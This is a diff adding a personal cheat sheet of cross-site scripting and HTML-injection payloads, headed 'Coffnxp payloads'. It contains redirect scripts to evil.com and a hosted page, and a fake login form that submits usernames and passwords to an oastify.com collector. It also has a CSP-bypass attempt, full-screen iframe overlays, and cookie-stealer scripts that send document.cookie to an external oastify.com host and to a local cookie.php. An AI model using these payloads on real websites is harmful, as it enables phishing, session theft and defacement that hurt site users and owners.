@@ -1,0 +1,26 @@
+Coffnxp payloads ;)
+
+<A HREF="http://evil.com/">Login Here </A>
+
+<script>document.location.href="http://evil.com"</script>
+
+<h3>Please login to proceed</h3> <form action=http://abp16yqa8m56p2kznk76xvmnqew5kwakz.oastify.com>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Login"></br>
+
+csp bypass:
+<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
+
+iframe:
+"><iframe src="https://nasa.gov" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%">
+
+<IFRAME SRC="javascript:alert(document.cookie);"></iframe>
+
+cookie stealer:
+<script>document.location='http://sb7j6gqs845opkkhn27oxdm5qwwnks8h.oastify.com?c='+document.cookie</script>
+
+<script>new Image().src="http://localhost/cookie.php?c="+document.cookie</script>
+
+<script>document.body.background=”https://www.jhadol.com/images/photos/original/1465212129eukl.jpg“;</script>
+
+<script>window.location=”https://coffinxp.000webhostapp.com/coffinxp1.html”;</script>
+
+<script>document.body.bgColor=”red”;</script>
